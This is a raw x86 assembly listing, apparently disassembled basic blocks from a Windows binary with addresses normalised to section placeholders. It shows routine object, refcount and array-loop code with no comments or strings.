mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
jmp r-xdata
lea esi [ ebp + 0x348 ]
mov ecx [ edx + 0x1c ]
or eax 0x1
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
cmp [ ebp + 0xe2a ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
or eax 0x1
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ ebp + 0x2ec ]
lea edx [ ebp + 0x2e8 ]
mov ecx eax
and ecx edi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push esi
call eax
xor edi edi
lea esi [ ebp + 0x910 ]
call sub_40d7c0
mov eax [ esi + 0x4 ]
test al 0x1
jne r-xdata
mov eax [ ebp + 0x998 ]
lea edx [ ebp + 0x994 ]
mov ecx eax
and ecx edi
jne r-xdata
push r--data
lea esi [ ebp + 0xa24 ]
push esi
call sub_41ff60
mov eax [ esi + 0x4 ]
mov ecx eax
and ecx edi
jne r-xdata
mov ecx [ edx + 0x1c ]
or eax 0x1
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ esp + 0x20 ] eax
mov [ esp + 0x94 ] 0x1d
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
xor esi esi
add ecx edx
je r-xdata
mov ecx [ esi + 0x1c ]
or eax 0x1
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push edi
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ esp + 0x74 ]
xor esi esi
cmp eax esi
je r-xdata
jmp r-xdata
mov ecx [ esi + 0x1c ]
or eax 0x1
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ ebp + 0x2ec ]
lea edx [ ebp + 0x2e8 ]
mov ecx eax
and ecx edi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push esi
call eax
push r--data
lea esi [ ebp + 0x39c ]
push esi
call sub_41ff60
mov eax [ esi + 0x4 ]
mov ecx eax
and ecx edi
jne r-xdata
mov ecx [ edx + 0x1c ]
or eax 0x1
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ebp + 0xc20 ]
lea edx [ ebp + 0xc1c ]
test al 0x1
jne r-xdata
mov ecx [ esi + 0x1c ]
or eax 0x1
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
push r--data
lea esi [ ebp + 0xa24 ]
push esi
call sub_41ff60
mov eax [ esi + 0x4 ]
mov ecx eax
and ecx edi
jne r-xdata
mov ecx [ edx + 0x1c ]
or eax 0x1
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
lea esi [ esp + 0x20 ]
call sub_4228c0
lea esi [ ebp + 0x170 ]
mov [ esp + 0x94 ] 0x23
mov ecx [ esi + 0x10 ]
sub ecx [ esi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
xor ebx ebx
add ecx edx
je r-xdata
mov ecx [ esi + 0x1c ]
or eax 0x1
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ rw-data ]
lea edi [ ebp + 0xb20 ]
mov [ edi + 0x38 ] eax
call sub_422a00
mov ecx [ esp + 0x20 ]
push ecx
push edi
call sub_41ff60
mov eax [ edi + 0x4 ]
mov edx eax
and edx 0x1
jne r-xdata
xor ebx ebx
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push esi
call eax
mov eax [ esp + 0x68 ]
push eax
mov [ esp + 0x78 ] esi
mov [ esp + 0x7c ] esi
mov [ esp + 0x80 ] esi
call sub_43f960
add esp 0x4
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov edi [ esp + 0x78 ]
push ecx
call sub_429630
mov edx [ esp + 0x78 ]
add esp 0x4
push edx
call sub_43f960
add esp 0x4
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp esi ecx
jb r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push esi
call eax
lea esi [ ebp + 0x39c ]
jmp r-xdata
or eax 0x1
mov [ edx + 0x4 ] eax
mov ecx [ edx + 0x1c ]
test ecx ecx
je r-xdata
cmp [ ebp + 0xe2a ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
or eax 0x1
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ ebp + 0x944 ]
lea edx [ ebp + 0x940 ]
test al 0x1
jne r-xdata
mov ecx [ edx + 0x1c ]
or eax 0x1
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push edi
push 0x1
push edi
push esi
call eax
lea esi [ esp + 0x18 ]
call sub_4228c0
lea ebx [ ebp + 0x170 ]
mov [ esp + 0x94 ] 0x25
mov ecx [ ebx + 0x10 ]
sub ecx [ ebx + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
xor edi edi
add ecx edx
je r-xdata
mov ecx [ esi + 0x1c ]
or eax 0x1
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ rw-data ]
lea edi [ ebp + 0xb20 ]
mov [ edi + 0x38 ] eax
call sub_422a00
mov ecx [ esp + 0x20 ]
push ecx
push edi
call sub_41ff60
mov eax [ edi + 0x4 ]
mov edx eax
and edx 0x1
jne r-xdata
mov [ esp + 0x18 ] ebx
lea esp [ esp ]
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push esi
call eax
cmp [ ebp + 0xe29 ] 0x0
je r-xdata
mov ecx [ edi + 0x1c ]
or eax 0x1
mov [ edi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ebp + 0x17c ]
add eax ebx
lea ecx [ eax + 0x74 ]
mov eax [ ecx + 0x14 ]
push r--data
mov edi 0x8
call sub_4298e0
test eax eax
je r-xdata
call sub_4407b7
mov eax [ ebp + 0x17c ]
imul esi esi 0xd8
add eax esi
lea ecx [ eax + 0x74 ]
mov eax [ ecx + 0x14 ]
push r--data
mov edi 0xb
call sub_4298e0
test eax eax
je r-xdata
call sub_4407b7
push r--data
push esi
call sub_41ff60
mov eax [ esi + 0x4 ]
mov ecx eax
and ecx edi
jne r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ ebp + 0x31c ]
lea edx [ ebp + 0x318 ]
mov ecx eax
and ecx edi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push esi
call eax
push r--data
lea esi [ ebp + 0xc54 ]
push esi
call sub_41ff60
mov eax [ esi + 0x4 ]
test al 0x1
jne r-xdata
mov ecx [ edx + 0x1c ]
or eax 0x1
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov edx [ rw-data ]
lea edi [ ebp + 0xb20 ]
mov [ edi + 0x38 ] edx
call sub_422a00
mov esi [ esp + 0x18 ]
push esi
push edi
call sub_41ff60
mov eax [ edi + 0x4 ]
mov ecx eax
and ecx 0x1
jne r-xdata
mov esi ebx
call sub_40f5a0
mov ecx eax
add ecx 0x74
mov esi r--data
call sub_412330
test al al
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push esi
call eax
cmp [ ebp + 0xe2a ] 0x0
je r-xdata
mov ecx [ edi + 0x1c ]
or eax 0x1
mov [ edi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ esi + 0xc ]
add eax [ esp + 0x18 ]
push r--data
lea ecx [ eax + 0x74 ]
mov eax [ ecx + 0x14 ]
mov edi 0xa
call sub_4298e0
test eax eax
je r-xdata
call sub_4407b7
cmp [ ebp + 0xe2a ] 0x0
je r-xdata
mov eax [ ebp + 0x9c8 ]
lea edx [ ebp + 0x9c4 ]
mov ecx eax
and ecx 0x1
jne r-xdata
mov eax [ ecx ]
push edx
push 0x1
push edx
mov edx [ eax + 0x28 ]
push edi
call edx
mov eax 0x7
xor ebx ebx
xor edx edx
mov [ esp + 0x64 ] eax
mov [ esp + 0x60 ] ebx
mov [ esp + 0x50 ] dx
mov [ esp + 0x80 ] eax
xor eax eax
mov [ esp + 0x7c ] ebx
mov [ esp + 0x6c ] ax
mov [ esp + 0x94 ] 0x1f
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp esi ecx
jb r-xdata
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
inc esi
add ecx edx
add ebx 0xd8
cmp esi ecx
jb r-xdata
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov esi [ esp + 0x28 ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
inc esi
add eax edx
mov [ esp + 0x28 ] esi
cmp esi eax
jb r-xdata
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp [ esp + 0x28 ] eax
jb r-xdata
lea esi [ ebp + 0x3f0 ]
jmp r-xdata
mov ecx [ edx + 0x1c ]
or eax 0x1
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
push r--data
lea esi [ ebp + 0xca8 ]
push esi
call sub_41ff60
mov eax [ esi + 0x4 ]
test al 0x1
jne r-xdata
mov ecx [ esi + 0x1c ]
or eax 0x1
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov [ esp + 0x94 ] 0xffffffff
lea eax [ esi - 0x10 ]
mov ecx [ edi + 0x1c ]
or eax 0x1
mov [ edi + 0x4 ] eax
test ecx ecx
je r-xdata
mov esi ebx
call sub_40f5a0
cmp [ eax + 0x90 ] 0x0
je r-xdata
mov ecx [ ebx + 0x10 ]
sub ecx [ ebx + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
inc edi
add eax edx
cmp edi eax
jb r-xdata
mov [ esp + 0x94 ] 0xffffffff
mov eax [ esp + 0x20 ]
add eax 0xfffffff0
jmp r-xdata
mov eax [ ebp + 0x9c8 ]
lea edx [ ebp + 0x9c4 ]
mov ecx eax
and ecx 0x1
jne r-xdata
mov eax [ ecx ]
push edx
push 0x1
push edx
mov edx [ eax + 0x28 ]
push edi
call edx
mov edi ebx
call sub_40f5a0
cmp [ eax + 0x90 ] 0x0
je r-xdata
mov ecx [ esi + 0x10 ]
sub ecx [ esi + 0xc ]
add [ esp + 0x18 ] 0xd8
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
inc ebx
add ecx edx
cmp ebx ecx
jb r-xdata
mov eax [ ebp + 0x9c8 ]
lea edx [ ebp + 0x9c4 ]
mov ecx eax
and ecx 0x1
jne r-xdata
push r--data
lea esi [ ebp + 0xa78 ]
push esi
call sub_41ff60
mov eax [ esi + 0x4 ]
mov ecx eax
and ecx 0x1
jne r-xdata
mov ecx [ edx + 0x1c ]
or eax 0x1
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ebp + 0x17c ]
mov edi esi
imul edi edi 0xd8
mov edx [ edi + eax + 0x98 ]
or edx [ edi + eax + 0x9c ]
je r-xdata
call sub_4407b7
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
jmp r-xdata
mov esi [ esp + 0x28 ]
mov ecx [ ebp + 0x17c ]
cmp [ ecx + esi + 0x70 ] 0x0
je r-xdata
call sub_4407b7
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ esi + 0x1c ]
or eax 0x1
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x28 ]
push 0x0
push 0x1
push 0x0
push esi
call edx
cmp [ esp + 0x1f ] 0x0
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push edi
call eax
push r--data
call sub_40f5a0
mov ecx [ eax + 0x90 ]
push ecx
push r--data
lea edi [ esp + 0x24 ]
call sub_412480
add esp 0xc
mov [ esp + 0x1f ] 0x1
jmp r-xdata
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
push r--data
lea edi [ ebp + 0xa78 ]
push edi
call sub_41ff60
mov eax [ edi + 0x4 ]
mov ecx eax
and ecx 0x1
jne r-xdata
mov ecx [ edx + 0x1c ]
or eax 0x1
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
push r--data
mov edi ebx
call sub_40f5a0
mov edx [ eax + 0x90 ]
push edx
push r--data
lea edi [ esp + 0x2c ]
call sub_412480
add esp 0xc
mov [ esp + 0x1f ] 0x1
mov ecx [ esi + 0x10 ]
sub ecx [ esi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
jmp r-xdata
push r--data
lea esi [ ebp + 0xa78 ]
push esi
call sub_41ff60
mov eax [ esi + 0x4 ]
mov ecx eax
and ecx 0x1
jne r-xdata
mov ecx [ edx + 0x1c ]
or eax 0x1
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ esp + 0x18 ] eax
mov [ esp + 0x94 ] 0x20
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
xor esi esi
add ecx edx
je r-xdata
mov ecx [ esi + 0x1c ]
or eax 0x1
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
mov [ esp + 0x1f ] 0x1
mov eax [ ebp + 0xe68 ]
test eax eax
jne r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x28 ]
push 0x0
push 0x1
push 0x0
push esi
call edx
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ esp + 0x2c ] eax
mov [ esp + 0x94 ] 0x24
mov ecx [ esi + 0x10 ]
sub ecx [ esi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
xor ebx ebx
add ecx edx
je r-xdata
mov ecx [ edi + 0x1c ]
or eax 0x1
mov [ edi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ esp + 0x18 ] eax
mov [ esp + 0x94 ] 0x22
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
xor esi esi
add ecx edx
je r-xdata
mov ecx [ esi + 0x1c ]
or eax 0x1
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ rw-data ]
lea edi [ ebp + 0xb74 ]
mov [ edi + 0x38 ] eax
call sub_422a00
mov ecx [ esp + 0x18 ]
push ecx
push edi
call sub_41ff60
mov eax [ edi + 0x4 ]
mov edx eax
and edx 0x1
jne r-xdata
xor ebx ebx
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push esi
call eax
mov eax [ ebp + 0x17c ]
lea ecx [ esp + 0x68 ]
push ecx
mov ecx [ eax + edi + 0x9c ]
lea edx [ esp + 0x50 ]
push edx
mov edx [ eax + edi + 0x98 ]
push ecx
push edx
call sub_41c6c0
mov ecx [ esp + 0x7c ]
mov esi 0x8
add esp 0x10
cmp [ esp + 0x80 ] esi
jae r-xdata
call sub_4407b7
mov edi [ esp + 0x28 ]
lea esi [ ebp + 0x170 ]
cmp eax 0x1
jne r-xdata
cmp [ ebp + 0xe2c ] 0x1
jne r-xdata
mov eax [ rw-data ]
lea edi [ ebp + 0xb74 ]
mov [ edi + 0x38 ] eax
call sub_422a00
mov esi [ esp + 0x2c ]
push esi
push edi
call sub_41ff60
mov eax [ edi + 0x4 ]
mov ecx eax
and ecx 0x1
jne r-xdata
mov [ esp + 0x18 ] ebx
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push edi
call eax
mov eax [ rw-data ]
lea edi [ ebp + 0xb74 ]
mov [ edi + 0x38 ] eax
call sub_422a00
mov esi [ esp + 0x18 ]
push esi
push edi
call sub_41ff60
mov eax [ edi + 0x4 ]
mov ecx eax
and ecx 0x1
jne r-xdata
xor ebx ebx
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push esi
call eax
cmp [ ebp + 0xe2a ] 0x0
je r-xdata
mov ecx [ edi + 0x1c ]
or eax 0x1
mov [ edi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ebp + 0x17c ]
add eax ebx
lea ecx [ eax + 0x74 ]
mov eax [ ecx + 0x14 ]
push r--data
mov edi 0xa
call sub_4298e0
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
test eax eax
mov eax 0x4bda12f7
je r-xdata
call sub_4407b7
mov eax [ esp + 0x50 ]
cmp [ esp + 0x64 ] esi
jae r-xdata
lea ecx [ esp + 0x6c ]
call sub_40f5a0
mov [ esp + 0x24 ] eax
lea eax [ esp + 0x24 ]
push eax
lea ebx [ ebp + 0xe4c ]
lea esi [ ebp + 0x8bc ]
call sub_40f810
lea edx [ ebp + 0x7e4 ]
mov [ eax ] esi
mov eax [ edx + 0x4 ]
mov ecx eax
and ecx 0x1
jne r-xdata
call sub_40f5a0
mov [ esp + 0x24 ] eax
lea eax [ esp + 0x24 ]
push eax
lea ebx [ ebp + 0xe4c ]
lea esi [ ebp + 0x868 ]
call sub_40f810
lea edx [ ebp + 0x7b4 ]
mov [ eax ] esi
mov eax [ edx + 0x4 ]
mov ecx eax
and ecx 0x1
jne r-xdata
test eax eax
jne r-xdata
mov edi [ esp + 0x28 ]
lea esi [ ebp + 0x170 ]
call sub_40f5a0
lea edx [ esp + 0x24 ]
push edx
lea ebx [ ebp + 0xe4c ]
mov [ esp + 0x28 ] eax
lea esi [ ebp + 0x868 ]
call sub_40f810
lea edx [ ebp + 0x658 ]
mov [ eax ] esi
mov eax [ edx + 0x4 ]
mov ecx eax
and ecx 0x1
jne r-xdata
mov [ esp + 0x94 ] 0x23
jmp r-xdata
mov ecx [ edi + 0x1c ]
or eax 0x1
mov [ edi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ esi + 0xc ]
add eax [ esp + 0x18 ]
push r--data
lea ecx [ eax + 0x74 ]
mov eax [ ecx + 0x14 ]
mov edi 0x8
call sub_4298e0
mov ecx [ esi + 0x10 ]
sub ecx [ esi + 0xc ]
test eax eax
mov eax 0x4bda12f7
je r-xdata
call sub_4407b7
mov [ esp + 0x94 ] 0x1d
mov ecx [ edi + 0x1c ]
or eax 0x1
mov [ edi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ebp + 0x17c ]
add eax ebx
lea ecx [ eax + 0x74 ]
mov eax [ ecx + 0x14 ]
push r--data
mov edi 0x8
call sub_4298e0
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
test eax eax
mov eax 0x4bda12f7
je r-xdata
call sub_4407b7
mov [ esp + 0x94 ] 0x1d
mov eax [ esp + 0x18 ]
add eax 0xfffffff0
jmp r-xdata
mov eax [ ebp + 0x9f8 ]
lea edx [ ebp + 0x9f4 ]
mov ecx eax
and ecx 0x1
jne r-xdata
mov eax [ ecx ]
push edx
push 0x1
push edx
mov edx [ eax + 0x28 ]
push edi
call edx
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
inc esi
add ecx edx
add ebx 0xd8
cmp esi ecx
jb r-xdata
push ecx
push eax
push r--data
lea edi [ esp + 0x2c ]
call sub_412480
add esp 0xc
cmp [ esp + 0x80 ] esi
jb r-xdata
lea eax [ esp + 0x50 ]
mov eax [ ebp + 0x68c ]
lea edx [ ebp + 0x688 ]
mov ecx eax
and ecx 0x1
jne r-xdata
mov ecx [ edx + 0x1c ]
or eax 0x1
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ebp + 0x65c ]
lea edx [ ebp + 0x658 ]
mov ecx eax
and ecx 0x1
jne r-xdata
mov ecx [ edx + 0x1c ]
or eax 0x1
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov edi [ esp + 0x28 ]
lea esi [ ebp + 0x170 ]
call sub_40f5a0
mov [ esp + 0x24 ] eax
lea eax [ esp + 0x24 ]
push eax
lea ebx [ ebp + 0xe4c ]
lea esi [ ebp + 0x814 ]
call sub_40f810
lea edx [ ebp + 0x628 ]
mov [ eax ] esi
mov eax [ edx + 0x4 ]
mov ecx eax
and ecx 0x1
jne r-xdata
mov eax [ ebp + 0x86c ]
lea ebx [ ebp + 0x868 ]
mov ecx eax
and ecx 0x1
jne r-xdata
mov ecx [ edx + 0x1c ]
or eax 0x1
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
lea eax [ esi - 0x10 ]
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push edi
call eax
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
add [ esp + 0x18 ] 0xd8
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
inc ebx
add ecx edx
cmp ebx ecx
jb r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push edi
call eax
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
inc esi
add ecx edx
add ebx 0xd8
cmp esi ecx
jb r-xdata
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
push r--data
lea esi [ ebp + 0xacc ]
push esi
call sub_41ff60
mov eax [ esi + 0x4 ]
mov ecx eax
and ecx 0x1
jne r-xdata
mov ecx [ edx + 0x1c ]
or eax 0x1
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x17c ]
mov edi esi
imul edi edi 0xd8
cmp [ edi + ecx + 0x90 ] 0x0
je r-xdata
call sub_4407b7
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
jmp r-xdata
xor ecx ecx
mov [ esp + 0x94 ] 0x1d
mov [ esp + 0x80 ] 0x7
mov [ esp + 0x7c ] ebx
mov [ esp + 0x6c ] cx
cmp [ esp + 0x64 ] esi
jb r-xdata
mov eax [ esp + 0x6c ]
push eax
call sub_43f960
add esp 0x4
mov eax [ ebp + 0x8c0 ]
lea ebx [ ebp + 0x8bc ]
mov ecx eax
and ecx 0x1
jne r-xdata
mov ecx [ edx + 0x1c ]
or eax 0x1
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ ebp + 0x86c ]
lea ebx [ ebp + 0x868 ]
mov ecx eax
and ecx 0x1
jne r-xdata
mov ecx [ edx + 0x1c ]
or eax 0x1
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ ebp + 0x818 ]
lea ebx [ ebp + 0x814 ]
mov ecx eax
and ecx 0x1
jne r-xdata
mov ecx [ edx + 0x1c ]
or eax 0x1
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov edi [ esp + 0x28 ]
lea esi [ ebp + 0x170 ]
call sub_40f5a0
mov ecx eax
add ecx 0x74
mov esi r--data
call sub_412330
test al al
je r-xdata
mov ecx [ ebx + 0x1c ]
or eax 0x1
mov [ ebx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ esi + 0xc ]
mov edi ebx
imul edi edi 0xd8
cmp [ edi + ecx + 0x90 ] 0x0
je r-xdata
call sub_4407b7
mov ecx [ esi + 0x10 ]
sub ecx [ esi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
jmp r-xdata
mov ecx [ ebp + 0x17c ]
mov edi esi
imul edi edi 0xd8
cmp [ edi + ecx + 0x90 ] 0x0
je r-xdata
call sub_4407b7
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ esp + 0x2c ] eax
mov [ esp + 0x94 ] 0x21
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
xor esi esi
add ecx edx
je r-xdata
mov ecx [ esi + 0x1c ]
or eax 0x1
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
mov [ esp + 0x1f ] 0x1
mov edx [ esp + 0x50 ]
push edx
call sub_43f960
add esp 0x4
mov edi [ esp + 0x28 ]
lea esi [ ebp + 0x170 ]
call sub_40f5a0
mov ecx eax
add ecx 0x74
mov esi r--data
call sub_412330
test al al
je r-xdata
mov ecx [ ebx + 0x1c ]
or eax 0x1
mov [ ebx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov edi [ esp + 0x28 ]
lea esi [ ebp + 0x170 ]
call sub_40f5a0
mov ecx eax
add ecx 0x74
mov esi r--data
call sub_412330
test al al
je r-xdata
mov ecx [ ebx + 0x1c ]
or eax 0x1
mov [ ebx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov edi [ esp + 0x28 ]
lea esi [ ebp + 0x170 ]
call sub_40f5a0
mov ecx eax
mov eax [ ecx + 0x88 ]
add ecx 0x74
push r--data
mov edi 0x8
call sub_4298e0
test eax eax
jne r-xdata
mov ecx [ ebx + 0x1c ]
or eax 0x1
mov [ ebx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
